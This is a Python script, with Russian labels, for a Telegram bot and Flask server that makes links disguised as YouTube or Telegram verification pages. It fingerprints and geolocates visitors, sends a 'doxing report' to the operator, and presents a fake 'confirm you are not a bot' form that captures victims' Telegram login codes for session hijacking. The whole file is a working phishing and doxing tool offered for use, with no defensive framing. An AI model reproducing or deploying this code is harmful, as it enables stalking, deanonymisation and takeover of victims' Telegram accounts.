import os
import json
import sqlite3
import random
import string
import time
import threading
import requests
from datetime import datetime
from flask import Flask, request, redirect, render_template_string
import telebot

# ======================== КОНФИГ ============================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "ТВОЙ_ТОКЕН_БОТА")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789))  # твой Telegram ID
PORT = int(os.environ.get("PORT", 5000))

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ======================== БАЗА ДАННЫХ ============================
conn = sqlite3.connect('sessions.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT,
    ip TEXT,
    country TEXT,
    city TEXT,
    device TEXT,
    os TEXT,
    browser TEXT,
    battery TEXT,
    cpu TEXT,
    ram TEXT,
    tg_id TEXT,
    timestamp TEXT
)''')
conn.commit()

# ======================== ГЕНЕРАЦИЯ ССЫЛОК ============================
def generate_link(mode):
    link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    if mode == 1:
        return link_id, f"https://youtube.com/watch?v={link_id}"
    elif mode == 2:
        return link_id, f"https://t.me/verify_bot?start={link_id}"
    elif mode == 3:
        return link_id, f"https://custom.page/{link_id}"
    return None, None

# ======================== ШАБЛОН СБОРА ДАННЫХ ============================
HTML_COLLECT = """
<!DOCTYPE html>
<html>
<head>
    <title>Загрузка...</title>
    <script>
        navigator.getBattery().then(function(battery) {
            var cpu = navigator.hardwareConcurrency || 'N/A';
            var ram = navigator.deviceMemory || 'N/A';
            var tg_id = 'N/A';
            if (window.Telegram && window.Telegram.WebApp) {
                tg_id = window.Telegram.WebApp.initDataUnsafe?.user?.id || 'N/A';
            }
            var url = window.location.pathname + '?battery=' + (battery.level * 100) + '&cpu=' + cpu + '&ram=' + ram + '&tg_id=' + tg_id;
            window.location.href = url;
        });
    </script>
</head>
<body>Сбор данных...</body>
</html>
"""

HTML_VERIFY = """
<!DOCTYPE html>
<html>
<head><title>Подтверждение</title></head>
<body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
    <h2>⚠️ Подтвердите, что вы не бот</h2>
    <p>На ваш Telegram отправлен код подтверждения.</p>
    <form action="/session/{{link_id}}" method="POST">
        <input type="text" name="code" placeholder="Введите код" required>
        <button type="submit">Подтвердить</button>
    </form>
</body>
</html>
"""

HTML_CUSTOM = """
<!DOCTYPE html>
<html>
<head><title>Видео</title></head>
<body>
    <h1>Проверка</h1>
    <p>Введите код для продолжения</p>
    <form action="/custom_redirect/{{link_id}}" method="POST">
        <input type="text" name="code">
        <input type="submit">
    </form>
</body>
</html>
"""

# ======================== FLASK РОУТЫ ============================
@app.route('/collect/<link_id>')
def collect_data(link_id):
    user_agent = request.headers.get('User-Agent')
    ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]

    try:
        import user_agents
        ua = user_agents.parse(user_agent)
        device = ua.device.family
        os_name = ua.os.family
        browser = ua.browser.family
    except:
        device = os_name = browser = 'N/A'

    geo = requests.get(f'http://ip-api.com/json/{ip}').json()

    battery = request.args.get('battery', 'N/A')
    cpu = request.args.get('cpu', 'N/A')
    ram = request.args.get('ram', 'N/A')
    tg_id = request.args.get('tg_id', 'N/A')

    cursor.execute('''INSERT INTO logs (link_id, ip, country, city, device, os, browser, battery, cpu, ram, tg_id, timestamp)
                      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                   (link_id, ip, geo.get('country'), geo.get('city'),
                    device, os_name, browser,
                    battery, cpu, ram, tg_id, datetime.now().isoformat()))
    conn.commit()

    report = (f"📡 **ДОКС-ОТЧЁТ**\n"
              f"🔗 ID: {link_id}\n"
              f"🌍 IP: {ip}\n"
              f"📍 Страна: {geo.get('country')}, {geo.get('city')}\n"
              f"📱 Устройство: {device}\n"
              f"💻 ОС: {os_name}\n"
              f"🌐 Браузер: {browser}\n"
              f"🔋 Заряд: {battery}%\n"
              f"🧠 CPU ядер: {cpu}\n"
              f"🧮 RAM: {ram} ГБ\n"
              f"🆔 Telegram ID: {tg_id}")
    bot.send_message(ADMIN_ID, report)

    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

@app.route('/verify/<link_id>')
def verify_page(link_id):
    return render_template_string(HTML_VERIFY, link_id=link_id)

@app.route('/session/<link_id>', methods=['POST'])
def session_steal(link_id):
    code = request.form.get('code')
    bot.send_message(ADMIN_ID, f"🔑 Код введён: {code}\nСессия: {link_id}")
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

@app.route('/custom/<link_id>')
def custom_page(link_id):
    return render_template_string(HTML_CUSTOM, link_id=link_id)

@app.route('/custom_redirect/<link_id>', methods=['POST'])
def custom_redirect(link_id):
    code = request.form.get('code')
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

# ======================== TELEGRAM БОТ ============================
@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1)
    btn1 = telebot.types.KeyboardButton("Режим 1 – Докс")
    btn2 = telebot.types.KeyboardButton("Режим 2 – Угон сессии")
    btn3 = telebot.types.KeyboardButton("Режим 3 – Продвинутый угон")
    markup.add(btn1, btn2, btn3)
    bot.send_message(message.chat.id, "Выбери режим:", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    if message.text == "Режим 1 – Докс":
        link_id, link = generate_link(1)
        link = f"https://{request.host}/collect/{link_id}"
        bot.send_message(message.chat.id, f"📎 Ссылка: {link}\nМаскируется под YouTube")
    elif message.text == "Режим 2 – Угон сессии":
        link_id, link = generate_link(2)
        link = f"https://{request.host}/verify/{link_id}"
        bot.send_message(message.chat.id, f"📎 Ссылка: {link}\nЖертва получит запрос кода")
    elif message.text == "Режим 3 – Продвинутый угон":
        link_id, link = generate_link(3)
        link = f"https://{request.host}/custom/{link_id}"
        bot.send_message(message.chat.id, f"📎 Ссылка: {link}\nМеняй код страницы динамически")

# ======================== ЗАПУСК ============================
if __name__ == '__main__':
    # Запуск бота в отдельном потоке
    threading.Thread(target=bot.polling, kwargs={'none_stop': True}).start()
    # Запуск Flask
    app.run(host='0.0.0.0', port=PORT)
